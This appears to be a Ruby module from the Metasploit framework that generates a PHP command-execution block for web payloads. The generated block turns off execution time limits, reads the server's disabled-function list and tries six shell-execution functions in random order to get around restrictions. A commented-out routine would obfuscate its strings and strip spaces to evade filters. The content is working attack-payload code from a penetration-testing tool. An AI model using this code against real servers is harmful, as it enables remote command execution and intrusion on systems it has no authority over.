require 'msf/core'

###
#
###
module Msf::Payload::Php

	def initialize(info = {})
		super(info)
	end

	def get_system_block(cmd="$cmd")
		preamble = "
			@set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
			$disabled=@ini_get('disable_functions');
			if(!empty($disabled)){
				$disabled=preg_replace('/[, ]+/', ',', $disabled);
				$disabled=explode(',', $disabled);
				$disabled=array_map('trim', $disabled);
			}else{
				$disabled=array();
			}
			"
		shell_exec = "
			if(is_callable('shell_exec')and!in_array('shell_exec',$disabled)){
				$output=shell_exec($cmd);
			}else"
		passthru = "
			if(is_callable('passthru')and!in_array('passthru',$disabled)){
				ob_start();
				passthru($cmd);
				$output=ob_get_contents();
				ob_end_clean();
			}else"
		system = "
			if(is_callable('system')and!in_array('system',$disabled)){
				ob_start();
				system($cmd);
				$output=ob_get_contents();
				ob_end_clean();
			}else"
		exec = "
			if(is_callable('exec')and!in_array('exec',$disabled)){
				$output=array();
				exec($cmd,$output);
				$output=join(chr(10),$output).chr(10);
			}else"
		proc_open = "
			if(is_callable('proc_open')and!in_array('proc_open',$disabled)){
				$handle=proc_open($cmd,array(array(pipe,r),array(pipe,w),array(pipe,w)),$pipes);
				$output=NULL;
				while(!feof($pipes[1])){
					$output.=fread($pipes[1],1024);
				}
				@proc_close($handle);
			}else"
		popen = "
			if(is_callable('popen')and!in_array('popen',$disabled)){
				$fp=popen($cmd,r);
				$output=NULL;
				if(is_resource($fp)){
					while(!feof($fp)){
						$output.=fread($fp,1024);
					}
				}
				@pclose($fp);
			}else"
		fail_block = "
			{
				$output=false;
			}
		"

		exec_methods = [shell_exec, passthru, system, exec, proc_open, popen].sort_by { rand }
		buf = preamble + exec_methods.join("") + fail_block

		#
		# Replace all single-quoted strings with quoteless equivalents, e.g.: 
		#    echo('asdf'); 
		# becomes
		#    echo($a.$s.$d.$f);
		# and add "$a=chr(97);" et al to the top of the block
		#
		# Once this is complete, it is guaranteed that there are no spaces
		# inside strings.  This combined with the fact that there are no
		# function definitions, which require a space between the "function"
		# keyword and the name, means we can completely remove spaces.
		#
		#alpha_used = { 95 }
		#buf.gsub!(/'(.*?)'/) {
		#	str_array = []
		#	$1.each_byte { |c|
		#		if (('a'..'z').include?(c.chr))
		#			alpha_used[c] = 1
		#			str_array << "$#{c.chr}." 
		#		else
		#			str_array << "chr(#{c})."
		#		end
		#	}
		#	str_array.last.chop!
		#	str_array.join("")
		#}
		#if (alpha_used.length > 1)
		#	alpha_used.each_key { |k| buf = "$#{k.chr}=chr(#{k});" + buf }
		#end 

		#buf.gsub!(/\s*/, '')
		if cmd != "$cmd"
			buf = "$cmd=#{cmd};" + buf
		end

		return buf

	end

end
